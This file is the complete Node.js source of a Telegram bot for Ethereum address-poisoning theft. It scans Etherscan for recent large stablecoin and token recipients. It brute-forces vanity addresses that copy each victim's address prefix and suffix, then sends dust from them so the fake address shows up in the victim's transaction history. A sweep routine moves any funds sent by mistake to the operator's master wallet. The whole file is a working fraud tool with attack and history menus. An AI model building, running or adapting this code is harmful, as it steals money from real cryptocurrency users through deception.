const { ethers } = require("ethers");
const { Telegraf, Markup } = require('telegraf');
const mongoose = require('mongoose');
const axios = require('axios');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
require('dotenv').config();

// --- 1. Database Setup ---
mongoose.connect(process.env.MONGO_URI);
const Target = mongoose.model('Target', {
    address: { type: String, unique: true },
    isDusted: { type: Boolean, default: false },   // True if identified by scan
    isAttacked: { type: Boolean, default: false }, // True if /dust was called
    vanityAddress: String,
    vanityPrivateKey: String,
    asset: String,
    amount: Number,
    timestamp: { type: Date, default: Date.now }
});

// --- 2. Vanity Worker Logic ---
if (!isMainThread) {
    const { prefix, suffix } = workerData;
    (async () => {
        while (true) {
            const wallet = ethers.Wallet.createRandom();
            const addr = wallet.address.toLowerCase();
            if (addr.startsWith("0x" + prefix) && addr.endsWith(suffix)) {
                parentPort.postMessage({ address: wallet.address, privateKey: wallet.privateKey });
                break;
            }
        }
    })();
    return;
}

// --- 3. Bot & Provider Setup ---
const bot = new Telegraf(process.env.BOT_TOKEN);
const provider = new ethers.JsonRpcProvider(process.env.RPC_HTTP);
const masterWallet = new ethers.Wallet(process.env.MASTER_PRIVATE_KEY, provider);

const TOKENS = {
    USDT: { addr: "0xdAC17F958D2ee523a2206206994597C13D831ec7", dec: 6 },
    USDC: { addr: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", dec: 6 },
    WBTC: { addr: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", dec: 8 },
    WETH: { addr: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", dec: 18 }
};

const ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function transfer(address to, uint256 amount) public returns (bool)"
];

// --- 4. Whale Fetcher with Range Filtering ---
async function fetchRecentWhales(minRange = 0, maxRange = Infinity) {
    const apiKey = process.env.ETHERSCAN_KEY;
    const whales = [];

    for (const [symbol, info] of Object.entries(TOKENS)) {
        try {
            const url = `https://api.etherscan.io/api?module=account&action=tokentx&contractaddress=${info.addr}&page=1&offset=50&sort=desc&apikey=${apiKey}`;
            const res = await axios.get(url);
            
            if (res.data.result && Array.isArray(res.data.result)) {
                for (const tx of res.data.result) {
                    const amount = parseFloat(ethers.formatUnits(tx.value, info.dec));
                    
                    // Filter based on the chosen range
                    if (amount >= minRange && amount <= maxRange) {
                        whales.push({ addr: tx.to, bal: amount, asset: symbol });
                    }
                }
            }
        } catch (e) { console.error(`Etherscan error for ${symbol}:`, e.message); }
    }
    // Sort by balance (highest first) and return top 10
    return whales.sort((a, b) => b.bal - a.bal).slice(0, 10);
}

// --- 5. Sweep Logic ---
async function sweepEverything() {
    const targets = await Target.find({ vanityPrivateKey: { $ne: null } });
    let totalEthRecovered = 0;
    let tokensRecovered = [];

    for (const target of targets) {
        try {
            const vanityWallet = new ethers.Wallet(target.vanityPrivateKey, provider);
            const ethBalance = await provider.getBalance(vanityWallet.address);
            
            for (const [symbol, info] of Object.entries(TOKENS)) {
                const tokenContract = new ethers.Contract(info.addr, ERC20_ABI, vanityWallet);
                const tokenBalance = await tokenContract.balanceOf(vanityWallet.address);

                if (tokenBalance > 0n) {
                    const feeData = await provider.getFeeData();
                    const gasLimit = 65000n; 
                    const requiredGas = feeData.gasPrice * gasLimit;

                    if (ethBalance < requiredGas) {
                        const topUp = requiredGas + ethers.parseEther("0.0005");
                        const fuelTx = await masterWallet.sendTransaction({ to: vanityWallet.address, value: topUp });
                        await fuelTx.wait();
                        await new Promise(r => setTimeout(r, 2000));
                    }

                    const tx = await tokenContract.transfer(masterWallet.address, tokenBalance);
                    await tx.wait();
                    tokensRecovered.push(`${ethers.formatUnits(tokenBalance, info.dec)} ${symbol}`);
                }
            }

            const finalEthBal = await provider.getBalance(vanityWallet.address);
            const feeData = await provider.getFeeData();
            if (finalEthBal > (feeData.gasPrice * 21000n)) {
                const valueToSend = finalEthBal - (feeData.gasPrice * 21000n);
                const tx = await vanityWallet.sendTransaction({ to: masterWallet.address, value: valueToSend });
                await tx.wait();
                totalEthRecovered += parseFloat(ethers.formatEther(valueToSend));
            }

            target.vanityPrivateKey = null;
            await target.save();
        } catch (e) { console.error(`Sweep failed:`, e.message); }
    }
    return { eth: totalEthRecovered, tokens: tokensRecovered };
}

// --- 6. Bot Actions & Menus ---

const mainMenu = (ctx) => {
    return ctx.reply("⚡ **Whale Control Center**", Markup.inlineKeyboard([
        [Markup.button.callback('🔍 Scan Whales', 'scan_menu')],
        [Markup.button.callback('📜 View History', 'history_menu')]
    ]));
};

bot.start(async (ctx) => {
    await ctx.reply("🧹 Running initial sweep...");
    const report = await sweepEverything();
    await ctx.reply(`✅ Swept: ${report.eth.toFixed(4)} ETH\n🎁 Tokens: ${report.tokens.join(', ') || 'None'}`);
    mainMenu(ctx);
});

// --- SCAN SUB-MENU ---
bot.action('scan_menu', async (ctx) => {
    await ctx.editMessageText("🎯 **Select Scan Range (USDT Value):**", Markup.inlineKeyboard([
        [Markup.button.callback('All Amounts', 'scan_0_99999999')],
        [Markup.button.callback('100 - 999 USDT', 'scan_100_999')],
        [Markup.button.callback('1,000 - 9,999 USDT', 'scan_1000_9999')],
        [Markup.button.callback('10,000+ USDT', 'scan_10000_99999999')],
        [Markup.button.callback('⬅️ Back', 'start_over')]
    ]));
});

// --- HISTORY SUB-MENU ---
bot.action('history_menu', async (ctx) => {
    await ctx.editMessageText("📜 **Select History Type:**", Markup.inlineKeyboard([
        [Markup.button.callback('Whales Found', 'hist_found')],
        [Markup.button.callback('Whales Attacked', 'hist_attacked')],
        [Markup.button.callback('⬅️ Back', 'start_over')]
    ]));
});

bot.action('start_over', (ctx) => mainMenu(ctx));

// --- SCAN EXECUTION ---
bot.action(/^scan_(\d+)_(\d+)$/, async (ctx) => {
    const min = parseInt(ctx.match[1]);
    const max = parseInt(ctx.match[2]);

    await ctx.answerCbQuery("🔎 Scanning...");
    const list = await fetchRecentWhales(min, max);

    if (list.length === 0) return ctx.reply("❌ No whales found in this range. Try again.");

    let msg = `💎 **TARGETS (${min}-${max > 1000000 ? 'INF' : max} USDT)**\n\n`;
    for (const w of list) {
        msg += `💰 **${w.bal.toLocaleString()} ${w.asset}**\nAddr: \`${w.addr}\`\nAction: /dust_${w.addr}\n\n`;
        // Store as "found"
        await Target.findOneAndUpdate({ address: w.addr }, { isDusted: true, amount: w.bal, asset: w.asset }, { upsert: true });
    }
    ctx.reply(msg, { parse_mode: 'Markdown' });
});

// --- HISTORY DISPLAY ---
bot.action(/hist_(found|attacked)/, async (ctx) => {
    const type = ctx.match[1];
    const query = type === 'found' ? { isDusted: true } : { isAttacked: true };
    const items = await Target.find(query).limit(10).sort({ timestamp: -1 });

    let msg = type === 'found' ? "📜 **HISTORY: WHALES FOUND**\n\n" : "⚔️ **HISTORY: WHALES ATTACKED**\n\n";
    
    if (items.length === 0) msg += "Empty.";
    items.forEach(i => {
        msg += `• \`${i.address}\` | ${i.amount} ${i.asset}\n`;
    });
    ctx.reply(msg, { parse_mode: 'Markdown' });
});

// --- ATTACK COMMAND ---
bot.hears(/^\/dust_(0x[a-fA-F0-9]{40})$/, async (ctx) => {
    const target = ctx.match[1];
    const prefix = target.substring(2, 6);
    const suffix = target.slice(-3);

    ctx.reply(`🛰️ **Brute-forcing vanity for ${target}...**`);

    const worker = new Worker(__filename, { workerData: { prefix, suffix } });
    worker.on('message', async (vanity) => {
        try {
            const fund = await masterWallet.sendTransaction({ to: vanity.address, value: ethers.parseEther("0.004") });
            await fund.wait();

            const vanitySigner = new ethers.Wallet(vanity.privateKey, provider);
            const dust = await vanitySigner.sendTransaction({ to: target, value: ethers.parseEther("0.0001") });
            
            await Target.findOneAndUpdate(
                { address: target }, 
                { isAttacked: true, vanityAddress: vanity.address, vanityPrivateKey: vanity.privateKey }, 
                { upsert: true }
            );

            ctx.reply(`✨ **Attacked!**\nTarget: \`${target}\`\n[Tx](https://etherscan.io/tx/${dust.hash})`, { parse_mode: 'Markdown' });
        } catch (e) { ctx.reply(`❌ Error: ${e.message}`); }
    });
});

bot.launch();